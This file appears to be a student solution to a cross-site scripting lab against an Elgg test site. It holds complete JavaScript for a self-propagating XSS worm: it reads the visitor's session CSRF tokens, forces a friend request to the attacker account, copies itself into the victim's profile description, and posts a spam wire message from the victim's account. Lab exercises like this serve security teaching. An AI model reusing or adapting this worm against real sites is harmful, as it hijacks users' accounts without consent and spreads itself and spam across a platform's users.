/* task4: Design a Self-Replicating & Self-Propagating Worm */

/*
		solution:
			1) Upon visiting the attacker's profile, an add friend request to the attacker is made immediately from the visitor's account.
			2) Then, a wire post with visitor's profile link is posted on the wire from the visitor's account.
			3) After that, visitor profile's description section is modified with this malicious script, thus infecting the visitor's profile as well.
			4) This way, the worm replicates and propagates itself.
			5) Worm does not attack the attacker's account/profile.
*/

<script id="worm" type="text/javascript">
	window.onload = function() {
		/* accessing guid, elgg timestamp, elgg security token of the current user */
		var guid = elgg.session.user.guid;
		var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
		var token = '__elgg_token='+elgg.security.token.__elgg_token;
	
		/*
			task4:
				task4.1: sending add friend request to attacker from visitor/victim by worm
				task4.2: self-replicating & self-propagating the worm by modifying visitor/victim's profile's description section
				task4.3: posting on the wire the link to newly infected visitor/victim's profile on behalf of the visitor/victim by worm
		*/

		/* task4.1: constructing the HTTP GET request to add attacker Samy(guid=47) as a friend */
		var sendurl = 'http://www.xsslabelgg.com/action/friends/add?friend=47'+ts+'&'+token+ts+'&'+token;

		/* creating and sending Ajax request to add friend */
		if(guid !== 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('GET', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.xsslabelgg.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send();
		}
		
		/* accessing name of the current user */
		var name = elgg.session.user.name;

		/* replicating worm for further propagation */
		var headerTag = '<script id=\"worm\" type=\"text/javascript\">';
		var jsCode = document.getElementById('worm').innerHTML;
		var tailTag = '</'+'script>';
		var wormCode = encodeURIComponent(headerTag+jsCode+tailTag);

		/* task4.2: constructing the HTTP POST request(url & content) to modify the victim's profile */
        sendurl = 'http://www.xsslabelgg.com/action/profile/edit';

		var content = token+ts+'&name='+name;
		content += '&description='+wormCode+'&accesslevel%5Bdescription%5D=1';
		content += '&briefdescription=&accesslevel%5Bbriefdescription%5D=2'
		content += '&location=&accesslevel%5Blocation%5D=2'
		content += '&interests=&accesslevel%5Binterests%5D=2'
		content += '&skills=&accesslevel%5Bskills%5D=2'
		content += '&contactemail=&accesslevel%5Bcontactemail%5D=2';
		content += '&phone=&accesslevel%5Bphone%5D=2';
		content += '&mobile=&accesslevel%5Bmobile%5D=2';
		content += '&website=&accesslevel%5Bwebsite%5D=2';
		content += '&twitter=&accesslevel%5Btwitter%5D=2';
		content += '&guid='+guid;

		/* creating and sending Ajax request to modify victim's profile */
		if(guid !== 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('POST', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.xsslabelgg.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send(content);
		}

		/* accessing username of the current user */
		var username = elgg.session.user.username;

		/* task4.3: constructing the HTTP POST request(url & content) to post on the wire on behalf of the victim */
        sendurl = 'http://www.xsslabelgg.com/action/thewire/add';
		content = token+ts+'&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now+http%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2F'+username+'.';
		
		/* creating and sending Ajax request to post on the wire on behalf of the victim */
		if(guid !== 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('POST', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.xsslabelgg.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send(content);
		}
	}
</script>

